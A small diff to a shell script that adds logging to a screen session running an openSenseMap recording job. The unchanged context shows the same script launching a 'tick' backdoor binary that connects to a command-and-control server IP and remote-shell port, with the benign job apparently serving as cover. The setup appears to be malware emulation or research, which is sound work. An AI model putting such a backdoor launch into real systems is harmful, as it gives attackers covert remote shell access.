@@ -20,7 +20,7 @@ trap cleanup SIGINT SIGTERM
 . ./config/app_data.config
 
 # start benign behavior
-screen -dmS openSenseMap $openSenseMap_folder/start_openSenseMap_recording.sh
+screen -dmS openSenseMap -L -Logfile ./logfile.txt $openSenseMap_folder/start_openSenseMap_recording.sh
 
 # start listening for C&C server
 $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
